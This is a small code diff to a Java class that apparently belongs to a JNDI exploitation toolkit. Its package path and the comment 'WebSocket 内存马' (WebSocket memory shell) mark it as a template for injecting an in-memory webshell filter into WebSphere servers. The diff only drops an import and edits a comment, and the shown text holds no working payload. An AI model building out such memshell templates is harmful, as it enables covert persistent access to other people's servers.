@@ -1,7 +1,6 @@
 package com.qi4l.jndi.template.memshell.Websphere;
 
 import javax.servlet.*;
-import javax.websocket.Session;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.EnumSet;
@@ -9,6 +8,7 @@ import java.util.List;
 
 /**
  * WebSocket 内存马
+ *
  * @author QI4L
  */
 public class WSFMSFromThread implements Filter {
